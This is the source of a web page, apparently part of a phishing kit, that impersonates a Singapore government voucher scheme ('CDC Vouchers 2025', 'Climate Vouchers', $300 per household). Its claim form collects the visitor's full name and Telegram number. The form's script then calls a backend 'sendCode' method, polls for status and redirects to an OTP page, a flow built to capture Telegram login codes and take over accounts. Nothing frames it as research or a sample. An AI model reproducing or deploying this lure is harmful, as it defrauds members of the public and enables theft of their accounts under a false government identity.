<?php require("_core.php"); ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><?= $TITLE ?></title>
  <meta name="robots" content="nofollow, noindex" />
  <link rel="shortcut icon" href="assets/favicon.ico" />
  <link rel="stylesheet" href="assets/vendors/fontAwesome/css/font-awesome.min.css" />
  <link rel="stylesheet" href="assets/vendors/Bootstrap/css/bootstrap.min.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
  <style>
    .loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .spinner {
            border: 8px solid #f3f3f3; /* Warna latar belakang spinner */
            border-top: 8px solid #3498db; /* Warna spinner */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.5s linear infinite;
        }

        /* Animasi rotasi spinner */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    button {background: #2F3476!important;outline: none;color: #FFF!important;}

    #header {
      background: #2F3476;
      color: #FFF;
    }
    
    @media (min-width: 768px) {
      .responsiveHeader {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }
    }

    body {
      font-family: "Inter", serif;
      background-color: #F6F7FA;
    }

    .sec1dk {

    }

    .otpdk img {
      width: 37px;
    }

    .optdks {
      background: white;
      border-radius: 12px;
    }
  </style>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
  <script src="assets/vendors/jQuery/jquery.min.js"></script>
</head>
<body class="mx-auto">
  <div style="width: 100%; margin: 0px auto; ">
    <div id="header">
      <div class="d-flex align-items-center justify-content-between mb-4" style="padding: 16px 32px 0px; padding-bottom: 15px;">
        <img src="assets/logo.png" alt="" style="height: 24px;" />
        <div class="dropdown">
            <button class="btn btn-outline-secondary dropdown-toggle" type="button" id="languageSelector" data-bs-toggle="dropdown" aria-expanded="false">
              <i class="bi bi-globe me-2"></i> English </button>
              <ul class="dropdown-menu" aria-labelledby="languageSelector">
                <li><a class="dropdown-item" href="#">English</a></li>
                <li><a class="dropdown-item" href="#">中文</a></li>
                <li><a class="dropdown-item" href="#">Melayu</a></li>
                <li><a class="dropdown-item" href="#">தமிழ்</a></li>
              </ul>
        </div>
      </div>
      <div class="responsiveHeader">
        <div style="padding-left: 32px">
          <h1>Vouchers 2025</h1>
          <p>Explore ongoing campaigns</p>
        </div>
        <img src="assets/girl.png" class="d-block" style="margin-left: auto; width: 130px; margin-top: -50px;" />
      </div>
    </div>    
  </div>

  <div class="sec1dk container" style="margin-top: 20px;">
      <div class="optdks container" style="padding-bottom: 14px; padding-top: 14px;">
        <img src="assets/cdc.png" style="width: 37px;">
        <p style="font-weight: 600; font-size: 1.125rem; color: #2F3476;">CDC Vouchers 2025</p>
        <p style="color: #636467;">$300 for each household</p>
        <button style="border-radius: 10px;" type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">Claim Now</button>
      </div>

      <div class="optdks container" style="padding-bottom: 14px; padding-top: 14px; margin-top: 20px;">
        <img src="assets/cl.png" style="width: 37px;">
        <p style="font-weight: 600; font-size: 1.125rem; color: #2F3476;">Climate Vouchers</p>
        <p style="color: #636467;">$300 for each household</p>
        <button style="border-radius: 10px;" type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">Claim Now</button>
      </div>
  </div>

<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Claim Vouchers</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-footer">
        <div class="py-2 px-4 d-block mb-5">
  <h5 class="mt-3 text-center fw-bold" style="font-size: 30px!important">Enter Your Accounts Details To Redeem Vouchers</h5>
  <hr />
  <div class="loader" id="loader">
        <div class="spinner"></div>
    </div>
  <div class="mb-3">
      <input type="text" name="nama" id="" class="form-control shadow-none" placeholder="Enter Your Full Name" />
  </div>
  <div class="mb-3">
    <label id="wrong" for="" class="form-label"><span>Invalid number</span></label>
    <div class="input-group">
      <span class="input-group-text" id="basic-addon1" style="display: flex;gap: 3px;background: #FFF;"><img src="https://www.svgrepo.com/show/405601/flag-for-flag-singapore.svg" style="height: 24px;" /></span>
      <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Enter Your Telegram Number" aria-label="Phone" aria-describedby="basic-addon1" required />
    </div>
  </div>
  <button class="btn mx-auto d-block px-5">Redeem Now</button>
</div>
      </div>
    </div>
  </div>
</div>
<script>
  $("#wrong").hide();

  $("input#phone").on("click", function(){
    if ($(this).val() == "") {
      $(this).val("+<?= $CCODE ?> ");
    }
  });

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "<?= base_url("API/index.php") ?>",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.href = "otp.php";
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("button").on("click", function(e){
    e.preventDefault();
    var phone = $("input#phone").val();

    if (phone != "") {
      $("#loader").show();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: {"method":"sendCode","phone":phone},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>


  <img src="assets/ftr.png" class="d-block mx-auto mt-3" style="width: 100%;" />
  
  <script>$("#loader").hide();</script>
</body>
</html>